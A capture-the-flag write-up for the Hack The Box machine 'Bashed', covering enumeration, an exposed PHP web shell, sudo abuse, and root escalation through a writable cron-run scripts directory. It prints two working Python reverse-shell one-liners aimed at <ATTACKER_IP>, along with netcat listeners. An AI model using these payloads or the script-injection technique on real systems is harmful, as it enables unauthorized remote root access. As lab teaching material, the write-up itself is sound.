# 🧠 Hack The Box – Bashed Write-up

## 📌 Overview

**Bashed** is an easy-difficulty Linux machine from Hack The Box that focuses on web enumeration, shell interaction, and privilege escalation via misconfigured sudo permissions and scheduled script execution.

This write-up outlines a structured methodology covering:

* Full port enumeration
* Web content discovery
* Interactive shell access
* Privilege escalation to root

---

## 🔎 Reconnaissance

### 🔹 Full TCP Port Scan

We begin with an aggressive full-port scan to identify exposed services:

```bash
nmap -Pn -n -p- --open --min-rate 5000 -T4 <TARGET_IP>
```

**Explanation:**

* `-Pn` → Skip host discovery
* `-n` → No DNS resolution
* `-p-` → Scan all ports
* `--min-rate 5000` → Speed optimization
* `-T4` → Aggressive timing

The scan reveals an HTTP service running on port 80.

---

## 🌐 Web Enumeration

### 🔹 Directory Bruteforcing

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The following directories were discovered:

```
/images
/uploads
/php
/css
/dev
/js
/fonts
```

Inside `/dev`, we locate an interesting file:

```
phpbash.php
```

---

## 💻 Initial Access

![Image](https://camo.githubusercontent.com/ced19771d5555e546640f755b58504cf0be58ced8ebac5ddcc443ec30ccf93e8/68747470733a2f2f696d6167652e70726e747363722e636f6d2f696d6167652f7131684578483941524d4f55643453386f7a327065772e706e67)

![Image](https://www.admin-magazine.com/var/ezflow_site/storage/images/media/images/phpshell-f01/47645-1-eng-US/phpshell-F01_reference.jpg)

![Image](https://camo.githubusercontent.com/ae6c451248e5f74550551eb187e90e56ca950f44f4dcebf0ad25da63f581b7cb/68747470733a2f2f696d6167652e70726e747363722e636f6d2f696d6167652f414a396865564c4551363278703443564450636578412e706e67)

![Image](https://i.sstatic.net/X60iF.png)

Navigating to:

```
http://<TARGET_IP>/dev/phpbash.php
```

We discover a web-based PHP shell.

### 🔹 Verifying Context

```bash
whoami
```

This confirms we are executing commands as a low-privileged user.

---

## 🚩 User Flag

We enumerate the `/home` directory:

```bash
cd /home
ls
cd arrexel
ls
cat user.txt
```

User flag successfully retrieved.

---

# 🔼 Privilege Escalation

## 🔎 Checking Sudo Permissions

```bash
sudo -l
```

We discover that the user **scriptmanager** can execute commands without a password.

---

## 🔁 Switching User

```bash
sudo -u scriptmanager /bin/bash
```

However, interacting via the browser shell is unstable. A reverse shell is required.

---

## 🔌 Reverse Shell to Kali

### 🔹 On Attacker Machine

```bash
nc -lnvp 4444
```

### 🔹 On Target (phpbash)

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

We receive a fully interactive shell.

---

## 🔄 Switching to scriptmanager (Stable Shell)

```bash
sudo -u scriptmanager /bin/bash
whoami
```

Confirmed as:

```
scriptmanager
```

---

## 📂 Discovering Writable Scripts

We navigate to:

```bash
cd /scripts
```

This directory contains scripts executed periodically by root.

---

## 🧨 Privilege Escalation via Script Injection

We prepare a second listener:

```bash
nc -lvnp 5555
```

Then create a malicious Python reverse shell inside the `/scripts` directory:

```bash
echo "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<ATTACKER_IP>',5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" > test.py
```

Since scripts in this directory are executed as **root**, once triggered, we receive a root shell in our second Netcat listener.

---

## 👑 Root Access

Inside the new shell:

```bash
whoami
```

Output:

```
root
```

Retrieve the final flag:

```bash
cd /root
ls
cat root.txt
```

---

# 🏁 Conclusion

Bashed demonstrates several fundamental penetration testing concepts:

* Effective service enumeration
* Web directory discovery
* Exploiting exposed web shells
* Leveraging misconfigured sudo permissions
* Privilege escalation via writable scheduled scripts

This machine reinforces the importance of:

* Checking `sudo -l` early
* Investigating writable directories
* Understanding how scheduled tasks can introduce privilege escalation vectors

---


